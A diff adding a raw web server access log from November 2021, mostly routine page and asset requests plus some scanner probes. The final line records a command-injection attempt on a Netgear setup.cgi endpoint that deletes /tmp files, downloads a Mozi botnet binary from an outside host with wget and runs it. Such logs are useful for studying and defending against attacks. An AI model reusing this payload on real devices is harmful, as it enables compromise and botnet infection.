@@ -1,0 +1,26 @@
+92.63.184.128 - - [21/Nov/2021 18:19:37] "GET / HTTP/1.1" 200 -
+91.237.241.254 - - [21/Nov/2021 18:24:20] "GET / HTTP/1.1" 200 -
+106.75.79.172 - - [21/Nov/2021 18:25:32] "GET / HTTP/1.0" 200 -
+177.75.218.182 - - [21/Nov/2021 18:25:57] "GET / HTTP/1.1" 200 -
+112.162.1.65 - - [21/Nov/2021 18:26:54] "GET / HTTP/1.1" 200 -
+112.162.1.65 - - [21/Nov/2021 18:26:56] "GET /static/imgs/favicon.png HTTP/1.1" 200- -
+192.241.211.189 - - [21/Nov/2021 19:10:53] "GET / HTTP/1.1" 200 -                   -
+178.128.53.211 - - [21/Nov/2021 19:23:41] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01ü\x01\x00\x01ø\x03\x030ÍñfeIêZÌ®¤')                           pe ('\x16\x03\x01\x01ü\x01\x00\x01ø\x03\x030Í
+178.128.53.211 - - [21/Nov/2021 19:23:41] "üø0ÍñfeIêZÌ®¤W" HTTPStatus.BAD_
+REQUEST -
+184.105.139.70 - - [21/Nov/2021 20:34:44] "GET / HTTP/1.1" 200 -
+192.168.29.1 - - [21/Nov/2021 20:35:20] "GET /static/css/background.png HTTP/1.1" 304 -
+209.141.46.14 - - [21/Nov/2021 20:59:37] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+5.62.25.55 - - [21/Nov/2021 21:05:04] "GET / HTTP/1.0" 200 -
+209.141.46.14 - - [21/Nov/2021 23:11:19] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+209.141.34.220 - - [21/Nov/2021 23:20:39] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+117.50.110.69 - - [21/Nov/2021 23:50:59] "GET / HTTP/1.1" 200 -
+117.50.110.69 - - [21/Nov/2021 23:51:00] "GET /static/imgs/favicon.png HTTP/1.1" 200 -
+117.50.110.69 - - [21/Nov/2021 23:51:04] "GET /static/js/jyfront_main.js HTTP/1.1" 
+200 -
+125.209.121.195 - - [22/Nov/2021 00:01:11] "GET / HTTP/1.1" 200 -
+80.82.77.192 - - [22/Nov/2021 00:11:32] "GET / HTTP/1.1" 200 -
+115.196.96.30 - - [22/Nov/2021 00:16:20] "GET / HTTP/1.1" 200 -
+213.87.96.96 - - [22/Nov/2021 00:21:59] "GET / HTTP/1.1" 200 -
+162.221.192.26 - - [22/Nov/2021 00:56:33] "GET / HTTP/1.1" 200 -
+194.158.222.30 - - [22/Nov/2021 01:16:18] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://194.158.222.30:42905/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 -
